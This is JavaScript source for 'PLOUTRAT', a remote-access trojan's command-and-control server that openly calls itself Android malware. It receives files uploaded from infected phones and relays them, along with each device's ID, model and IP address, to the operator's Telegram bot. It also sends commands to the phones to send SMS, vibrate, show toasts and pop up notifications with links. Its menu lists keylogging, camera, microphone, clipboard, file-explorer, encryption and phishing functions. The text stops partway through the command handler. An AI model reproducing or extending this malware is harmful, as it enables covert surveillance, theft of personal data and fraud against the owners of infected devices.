// ============================================
// PLOUTRAT - Android Malware Control Panel
// Developer: @CyberX_Hunter
// ============================================

// Import required modules
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

// Initialize app
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// Load configuration
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

// Initialize Telegram Bot
const bot = new telegramBot(data.token, {
    polling: true,
    request: {}
});

// Store app data
const appData = new Map();

// List of available actions
const actions = [
    '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯',
    '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯',
    '✯ 𝙲𝚊𝚕𝚕𝚜 ✯',
    '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯',
    '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯',
    '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯',
    '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯',
    '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯',
    '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯',
    '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯',
    '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯',
    '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯',
    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯',
    '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯',
    '✯ 𝚃𝚘𝚊𝚜𝚝 ✯',
    '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯',
    '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯',
    '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯',
    '✯ 𝙰𝚙𝚙𝚜 ✯',
    '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯',
    '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯',
    '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯',
    '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯'
];

// ============================================
// ROUTES
// ============================================

// File upload endpoint
app.post('/upload', uploader.single('file'), (req, res) => {
    const filename = req.file.originalname;
    const deviceId = req.headers['device-id'];
    
    bot.sendDocument(data.id, req.file.buffer, {
        caption: '<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + deviceId + '</b>',
        parse_mode: 'HTML'
    }, {
        filename: filename,
        contentType: '*/*'
    });
    
    res.send('<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢...</b>');
});

// Start endpoint
app.get('/start', (req, res) => {
    res.send(data.id);
});

// ============================================
// SOCKET.IO - Device Connection Handler
// ============================================

io.on('connection', (socket) => {
    // Extract device info
    let deviceId = socket.handshake.headers['device-id'] + '-' + 
                   io.sockets.sockets.size || 'unknown-device';
    let model = socket.handshake.headers['device-model'] || 'no information';
    let ip = socket.handshake.headers['ip'] || 'no information';
    
    socket.deviceId = deviceId;
    socket.model = model;
    socket.ip = ip;
    
    // Send connection notification
    let message = 
        '<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n' +
        '<b>𝙳𝚎𝚟𝚒𝚌𝚎 ' + deviceId + '\n' +
        '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + model + '\n' +
        '<b>𝚒𝚙</b> → ' + ip + '\n' +
        '<b>𝚝𝚒𝚖𝚎</b> → ' + socket.handshake.time + '\n\n';
    
    bot.sendMessage(data.id, message, {
        parse_mode: 'HTML'
    });
    
    // Handle device disconnect
    socket.on('disconnect', () => {
        let message = 
            '<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n' +
            '<b>𝙳𝚎𝚟𝚒𝚌𝚎 ' + deviceId + '\n' +
            '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + model + '\n' +
            '<b>𝚒𝚙</b> → ' + ip + '\n' +
            '<b>𝚝𝚒𝚖𝚎</b> → ' + socket.handshake.time + '\n\n';
        
        bot.sendMessage(data.id, message, {
            parse_mode: 'HTML'
        });
    });
    
    // Handle commands from device
    socket.on('commend', (data) => {
        bot.sendMessage(data.id, 
            '<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ' + 
            deviceId + '</b>\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>' + data, 
            { parse_mode: 'HTML' }
        );
    });
});

// ============================================
// TELEGRAM BOT - Command Handler
// ============================================

bot.on('message', (msg) => {
    const text = msg.text;
    const chatId = data.id;
    
    // ============================================
    // COMMAND: /start
    // ============================================
    if (text === '/start') {
        bot.sendMessage(chatId, 
            '<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 PLOUTRAT</b>\n\n' +
            'PLOUTRAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\n' +
            '𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n' +
            '𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CyberX_Hunter',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }
    
    // ============================================
    // COMMAND: Send SMS
    // ============================================
    else if (appData.get('currentAction') === 'smsNumber') {
        let number = msg.text;
        let target = appData.get('currentTarget');
        
        if (target == 'all') {
            io.sockets.emit('commend', {
                request: 'sendSms',
                extras: [{ key: 'number', value: number }]
            });
        } else {
            io.to(target).emit('commend', {
                request: 'sendSms',
                extras: [{ key: 'number', value: number }]
            });
        }
        
        appData.delete('currentTarget');
        appData.delete('currentAction');
        
        bot.sendMessage(chatId, 
            '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢...</b>',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }
    
    // ============================================
    // COMMAND: SMS Text
    // ============================================
    else if (appData.get('currentAction') === 'smsText') {
        let smsText = msg.text;
        let target = appData.get('currentTarget');
        
        if (target == 'all') {
            io.sockets.emit('commend', {
                request: 'sendSms',
                extras: [{ key: 'text', value: smsText }]
            });
        } else {
            io.to(target).emit('commend', {
                request: 'sendSms',
                extras: [{ key: 'text', value: smsText }]
            });
        }
        
        appData.delete('currentTarget');
        appData.delete('currentAction');
        
        bot.sendMessage(chatId, 
            '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢...</b>',
            { parse_mode: 'HTML' }
        );
    }
    
    // ============================================
    // COMMAND: SMS to All Contacts
    // ============================================
    else if (appData.get('currentAction') === 'smsToAllContacts') {
        let smsText = msg.text;
        appData.set('smsText', smsText);
        appData.set('currentAction', 'smsNumber');
        
        bot.sendMessage(chatId, 
            '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛...</b>\n\n',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['Cancel']],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            }
        );
    }
    
    // ============================================
    // COMMAND: Toast
    // ============================================
    else if (appData.get('currentAction') === 'toast') {
        let toastText = msg.text;
        let target = appData.get('currentTarget');
        let duration = appData.get('duration');
        
        if (target == 'all') {
            io.sockets.emit('commend', {
                request: 'toast',
                extras: [
                    { key: 'duration', value: duration },
                    { key: 'text', value: toastText }
                ]
            });
        } else {
            io.to(target).emit('commend', {
                request: 'toast',
                extras: [
                    { key: 'duration', value: duration },
                    { key: 'text', value: toastText }
                ]
            });
        }
        
        appData.delete('currentTarget');
        appData.delete('currentAction');
        appData.delete('duration');
        
        bot.sendMessage(chatId, 
            '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍...</b>',
            { parse_mode: 'HTML' }
        );
    }
    
    // ============================================
    // COMMAND: Vibrate
    // ============================================
    else if (appData.get('currentAction') === 'vibrateDuration') {
        let duration = msg.text;
        let target = appData.get('currentTarget');
        
        if (target == 'all') {
            io.sockets.emit('commend', {
                request: 'vibrate',
                extras: [{ key: 'duration', value: duration }]
            });
        } else {
            io.to(target).emit('commend', {
                request: 'vibrate',
                extras: [{ key: 'duration', value: duration }]
            });
        }
        
        appData.delete('currentTarget');
        appData.delete('currentAction');
        
        bot.sendMessage(chatId, 
            '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍...</b>',
            { parse_mode: 'HTML' }
        );
    }
    
    // ============================================
    // COMMAND: Notification
    // ============================================
    else if (appData.get('currentAction') === 'notificationText') {
        let notificationText = msg.text;
        let target = appData.get('currentTarget');
        let url = appData.get('url');
        
        if (target == 'all') {
            io.sockets.emit('commend', {
                request: 'popNotification',
                extras: [
                    { key: 'text', value: notificationText },
                    { key: 'url', value: url }
                ]
            });
        } else {
            io.to(target).emit('commend', {
                request: 'popNotification',
                extras: [
                    { key: 'text', value: notificationText },
                    { key: 'url', value: url }
                ]
            });
        }
        
        appData.delete('currentTarget');
        appData.delete('currentAction');
        appData.delete('url');
        
        bot.sendMessage(chatId, 
            '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍...</b>',
            { parse_mode: 'HTML' }
        );
    }
    
    // ============================================
    // COMMAND: Get Devices
    // ============================================
    else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(chatId, 
                '<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>',
                { parse_mode: 'HTML' }
            );
        } else {
            let message = 
                '<b>✯ 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : ' + 
                io.sockets.sockets.size + '</b>\n\n';
            let count = 1;
            
            io.sockets.sockets.forEach((socket, id) => {
                message += 
                    '<b>𝙳𝚎𝚟𝚒𝚌𝚎 ' + count + '</b>\n' +
                    '<b>𝙳𝚎𝚟𝚒𝚌𝚎 ' + socket.deviceId + '\n' +
                    '<b>𝚖𝚘𝚍𝚎𝚕</b> → ' + socket.model + '\n' +
                    '<b>𝚒𝚙</b> → ' + socket.ip + '\n' +
                    '<b>𝚝𝚒𝚖𝚎</b> → ' + socket.handshake.time + '\n\n';
                count++;
            });
            
            bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
        }
    }
    
    // ============================================
    // COMMAND: All Devices
    // ============================================
    else if (text === '✯ 𝙰𝚕𝚕 ✯') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(chatId, 
                '<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>',
                { parse_mode: 'HTML' }
            );
        } else {
            let keyboard = [];
            
            io.sockets.sockets.forEach((socket, id) => {
                keyboard.push([socket.deviceId]);
            });
            
            keyboard.push(['✯ 𝙰𝚕𝚕 ✯']);
            keyboard.push(['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
            
            bot.sendMessage(chatId, 
                '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎...</b>',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: keyboard,
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }
    }
    
    // ============================================
    // COMMAND: About Us
    // ============================================
    else if (text === '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯') {
        bot.sendMessage(chatId, 
            '<b>✯ If you want to hire us for any paid work...</b>\n\n' +
            '𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @CyberX_Hunter\n' +
            'ADMIN → @CyberX_Hunter',
            { parse_mode: 'HTML' }
        );
    }
    
    // ============================================
    // COMMAND: Cancel
    // ============================================
    else if (text === 'Cancel') {
        // Reset all states
        appData.delete('currentTarget');
        appData.delete('currentAction');
        appData.delete('smsText');
        appData.delete('duration');
        appData.delete('url');
        
        bot.sendMessage(chatId, 
            '✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯',
            { parse_mode: 'HTML' }
        );
    }
    
    // ============================================
    // COMMAND: Select Device
    // ============================================
    else if (text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
        bot.sendMessage(chatId, 
            '<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚕𝚕 ✯'],
                        ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );